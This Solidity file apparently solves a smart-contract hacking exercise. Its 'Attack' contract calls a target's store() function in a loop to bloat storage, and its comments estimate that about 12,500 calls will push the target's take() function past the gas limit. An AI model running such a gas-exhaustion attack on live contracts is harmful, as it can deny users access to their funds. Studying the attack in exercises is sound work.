// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./ExHackScDev07042022.sol";

//67115 gas used function store n°1
//52115 gas used function store n°>=2

//25240 gas used function take() Appel 1
//26442
//27644
//1200 gas en plus par element de tableau
//Soit 12500 appel de store


contract Attack{

    Store public store;

    constructor(Store _store) {
        store = Store(_store);
    }

    function attack() public {
        for(uint i=0;i< 150;i++){
            store.store();
        }
    }
    function attackbis() external {
        do{
            store.store();
        }while(gasleft() > 100000);
    }
}
